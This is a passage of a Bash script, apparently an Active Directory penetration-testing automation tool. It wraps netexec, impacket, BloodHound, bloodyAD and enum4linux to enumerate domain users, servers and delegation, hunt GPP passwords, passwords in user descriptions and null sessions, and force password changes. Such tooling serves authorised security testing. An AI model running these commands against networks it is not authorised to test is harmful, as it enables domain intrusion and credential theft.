                            read -rp ">> " pass_passchange </dev/tty
                        done
                        authuser_passchange=""
                        echo -e "${BLUE}[*] Please specify username for RPC authentication:${NC}"
                        read -rp ">> " authuser_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid username.${NC} Please specify username:"
                            read -rp ">> " authuser_passchange </dev/tty
                        done
                        authpass_passchange=""
                        echo -e "${BLUE}[*] Please specify password for RPC authentication:${NC}"
                        read -rp ">> " authpass_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid password.${NC} Please specify password:"
                            read -rp ">> " authpass_passchange </dev/tty
                        done
                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                        run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt"
                    fi
                    password="${pass_passchange}"
                    auth_check=""
                    prepare
                    authenticate
                fi
                echo -e ""
            fi
            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    if [ "${forcekerb_bool}" == true ]; then
        argument_ne="${argument_ne} -k"
    fi

    if [ "${verbose_bool}" == true ]; then
        ne_verbose="--verbose"
        argument_imp="-debug ${argument_imp}"
        argument_imp_gp="-debug ${argument_imp_gp}"
        argument_imp_ti="-debug ${argument_imp_ti}"
        argument_enum4linux="${argument_enum4linux} -v"
        argument_bhd="${argument_bhd} -v"
        argument_adidns="${argument_adidns} -v -d"
        argument_pre2k="${argument_pre2k} -verbose"
        argument_certsync="${argument_certsync} -debug"
        argument_donpapi="-d ${argument_donpapi}"
        argument_hekatomb="-debug ${argument_hekatomb}"
        argument_windap="${argument_windap} -v --debug"
        argument_targkerb="${argument_targkerb} -v"
        argument_kerbrute="-v"
        argument_manspider="${argument_manspider} -v"
        argument_coercer="${argument_coercer} -v"
        argument_CVE202233679="-debug"
        argument_bloodyad="-v DEBUG ${argument_bloodyad}"
        argument_aced="-debug ${argument_aced}"
        argument_sccm="-debug ${argument_sccm}"
        mssqlrelay_verbose="-debug"
        adalanche_verbose="--loglevel Debug"
        argument_pygpoabuse="${argument_pygpoabuse} -vv"
        argument_privexchange="${argument_privexchange} --debug"
    fi

    echo -e "${auth_string}"
}

parse_servers() {
    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/servers_list_*_"${dc_domain}.txt" | sort -uf >"${servers_hostname_list}" 2>&1
    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/dc_list_*_"${dc_domain}.txt" | sort -uf >"${dc_hostname_list}" 2>&1
    sort -uf <(sort -uf "${output_dir}"/DomainRecon/Servers/ip_list_*_"${dc_domain}.txt") >"${servers_ip_list}"
    sort -uf <(sort -uf "${output_dir}"/DomainRecon/Servers/dc_ip_list_*_"${dc_domain}.txt") >"${dc_ip_list}"

    if ! grep -q "${dc_ip}" "${servers_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${servers_ip_list}"; fi
    if ! grep -q "${dc_ip}" "${dc_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${dc_ip_list}"; fi
    if ! grep -q "${dc_FQDN^^}" "${dc_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${dc_hostname_list}"; fi
    if ! grep -q "${dc_FQDN^^}" "${servers_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${servers_hostname_list}"; fi
}

parse_users() {
    users_list="${output_dir}/DomainRecon/Users/users_list_${dc_domain}.txt"
    sort -uf <(sort -uf "${output_dir}"/DomainRecon/Users/users_list_*_"${dc_domain}.txt") >"${users_list}"

    if [[ ! "${user}" == "" ]] && ! grep -q "${user}" "${users_list}" 2>/dev/null; then echo "${user}" >>"${users_list}"; fi
}

dns_enum() {
    if [ ! -f "${adidnsdump}" ]; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
        dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
        if [ ! -f "${dns_records}" ]; then
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                echo -e "${PURPLE}[-] adidnsdump does not support Kerberos authentication${NC}"
            else
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                run_command "${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip}" | tee "${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt"
                mv records.csv "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null
                grep "A," "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep -v "DnsZones\|@" | cut -d "," -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${output_dir}/DomainRecon/Servers/servers_list_dns_${dc_domain}.txt"
                grep "A," "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep -v "DnsZones\|@" | cut -d "," -f 3 >"${output_dir}/DomainRecon/Servers/ip_list_dns_${dc_domain}.txt"
                grep "@" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "NS," | cut -d "," -f 3 | sed 's/\.$//' >"${output_dir}/DomainRecon/Servers/dc_list_dns_${dc_domain}.txt"
                grep "@" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | cut -d "," -f 3 >"${output_dir}/DomainRecon/Servers/dc_ip_list_dns_${dc_domain}.txt"
            fi
            parse_servers
        else
            parse_servers
            echo -e "${YELLOW}[i] DNS dump found ${NC}"
        fi
    fi
    echo -e ""
}

smb_scan() {
    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        if [ "${curr_targets}" == "Domain Controllers" ]; then
            servers_smb_list=${target_dc}
        elif [ "${curr_targets}" == "All domain servers" ]; then
            servers_scan_list=${target_servers}
            echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif [ "${curr_targets}" == "File containing list of servers" ]; then
            servers_scan_list=${custom_servers_list}
            echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                run_command "${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif [ "${curr_targets}" == "IP or hostname" ]; then
            servers_scan_list=$(head -n1 "${custom_servers_list}")
            echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                run_command "${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 1>/dev/null 2>&1
                grep -a "open" "${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt" 2>/dev/null | cut -d " " -f 2 >"${servers_smb_list}"
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        fi
    fi
}

###### ad_enum: AD Enumeration
bhd_enum() {
    if [ ! -f "${bloodhound}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/BloodHound"
        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/BloodHound/" -type f -name '*.json' -print -quit)" ]; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/BloodHound" || exit
                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
                #${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

bhd_enum_dconly() {
    if [ ! -f "${bloodhound}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/BloodHound"
        echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/BloodHound/" -type f -name '*.json' -print -quit)" ]; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/BloodHound" || exit
                run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
                cd "${current_dir}" || exit
                #${netexec} ${ne_verbose} ldap ${target} "${argument_ne}" --bloodhound -ns ${dc_ip} -c DCOnly --log tee "${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

bhdce_enum() {
    if [ ! -f "${bloodhoundce}" ]; then
        echo -e "${RED}[-] Please verify the installation of BloodhoundCE${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/BloodhoundCE"
        echo -e "${BLUE}[*] BloodhoundCE Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/BloodhoundCE/" -type f -name '*.json' -print -quit)" ]; then
            echo -e "${YELLOW}[i] BloodhoundCE results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] BloodhoundCE requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/BloodhoundCE" || exit
                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodhoundCE/bloodhound_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodhoundCE/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

bhdce_enum_dconly() {
    if [ ! -f "${bloodhoundce}" ]; then
        echo -e "${RED}[-] Please verify the installation of BloodhoundCE${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/BloodHoundCE"
        echo -e "${BLUE}[*] BloodHoundCE Enumeration using DCOnly${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/BloodHoundCE/" -type f -name '*.json' -print -quit)" ]; then
            echo -e "${YELLOW}[i] BloodHoundCE results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] BloodHoundCE requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/BloodHoundCE" || exit
                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt"
                cd "${current_dir}" || exit
                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

ldapdomaindump_enum() {
    if [ ! -f "${ldapdomaindump}" ]; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/LDAPDomainDump"
        echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
        if [ -n "$(find "${output_dir}"/DomainRecon/LDAPDomainDump/ -type f -name '*ldd_output*' -print -quit)" ]; then
            echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                echo -e "${PURPLE}[-] ldapdomaindump does not support Kerberos authentication ${NC}"
            else
                if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
                run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
            fi
            /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${output_dir}/DomainRecon/LDAPDomainDump/domain_users.json" 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_ldd_${dc_domain}.txt"
            /usr/bin/jq -r ".[].attributes.dNSHostName[]" "${output_dir}/DomainRecon/LDAPDomainDump/domain_computers.json" 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_ldd_${dc_domain}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

enum4linux_enum() {
    if [ ! -f "${enum4linux_py}" ]; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] enum4linux does not support Kerberos authentication using AES Key${NC}"
        else
            run_command "${enum4linux_py} -A ${argument_enum4linux} ${target} -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain}" >"${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt"
            head -n 20 "${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt" 2>&1
            echo -e "............................(truncated output)"
            /usr/bin/jq -r ".users[].username" "${output_dir}/DomainRecon/enum4linux_${dc_domain}.json" 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_enum4linux_${dc_domain}.txt"
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${CYAN}[*] Guest with empty password (null session)${NC}"
                run_command "${enum4linux_py} -A ${target} -u 'Guest' -p '' -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}" >"${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt"
                head -n 20 "${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt" 2>&1
                echo -e "............................(truncated output)"
                /usr/bin/jq -r ".users[].username" "${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json" 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt"
            fi
        fi
        parse_users
    fi
    echo -e ""
}

ne_gpp() {
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ne_smb_enum() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
        awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($10, arr, "\\"); print arr[2]}' "${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" | wc -l)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
        grep -v "\[-\|\[+\|\[\*" "${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 10 | cut -d "\\" -f 2 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" 2>&1
        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" >"${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt"
    fi
    parse_users
    echo -e ""
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --pass-pol --log ${output_dir}/DomainRecon/ne_passpol_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

ne_ldap_enum() {
    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 10 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" | wc -l)
        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 10 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
        count=$(sort -u "${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" | wc -l)
        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    fi
    parse_users
    echo -e ""
    echo -e "${BLUE}[*] DC List Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>&1
    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $10}' >"${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt" 2>&1
    grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $12}' >"${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt" 2>&1
    parse_servers
    echo -e ""
    echo -e ""
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
    grep -i "pass\|pwd" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
    if [ ! -s "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
        echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M maq --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_MachineAccountQuota_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] Subnets Enumeration${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M subnets --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_subnets_output_${dc_domain}.txt" 2>&1
    echo -e ""
    echo -e "${BLUE}[*] LDAP-signing check${NC}"
    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

deleg_enum() {
    if [ ! -f "${impacket_findDelegation}" ]; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        run_command "${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}" | tee "${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt"
        if grep -q 'error' "${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt"; then
            echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
        fi
    fi
    echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

fqdn_to_ldap_dn() {
    sed -e 's/[^ ]*/DC=&/g' -e 's/ /,/g' <<<"${1//./ }"
}

bloodyad_all_enum() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/bloodyAD"
        echo -e "${BLUE}[*] bloodyad All Enumeration${NC}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            domain_DN=$(fqdn_to_ldap_dn "${dc_domain}")
            echo -e "${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for attribute minPwdLength${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr minPwdLength" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for users${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype useronly" >"${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt"
            cut -d ',' -f 1 "${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt" | cut -d '=' -f 2 | sort -u >"${output_dir}/DomainRecon/Users/users_list_bla_${dc_domain}.txt" 2>/dev/null
            parse_users
            echo -e "${CYAN}[*] Searching for computers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype computer" >"${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt"
            cut -d "," -f 1 "${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt" | cut -d "=" -f 2 | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${output_dir}/DomainRecon/Servers/servers_list_bla_${dc_domain}.txt" 2>/dev/null
